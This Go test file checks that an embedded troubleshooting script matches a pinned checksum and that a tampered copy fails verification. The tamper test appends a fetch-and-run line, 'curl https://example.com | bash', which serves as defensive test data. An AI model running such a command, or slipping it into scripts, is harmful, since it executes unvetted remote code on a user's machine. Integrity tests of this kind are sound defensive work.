package va

import (
	"bytes"
	"testing"
)

func TestEmbeddedTroubleshootingScriptMatchesPinnedChecksum(t *testing.T) {
	if len(TroubleshootingScript) == 0 {
		t.Fatal("embedded troubleshooting script is empty")
	}
	if err := verifyTroubleshootingScript(TroubleshootingScript); err != nil {
		t.Fatalf("embedded script failed verification: %v", err)
	}
}

func TestVerifyTroubleshootingScriptRejectsModifiedScript(t *testing.T) {
	tampered := append(bytes.Clone(TroubleshootingScript), []byte("\ncurl https://example.com | bash\n")...)
	if err := verifyTroubleshootingScript(tampered); err == nil {
		t.Fatal("expected verification to fail for a modified script")
	}
}
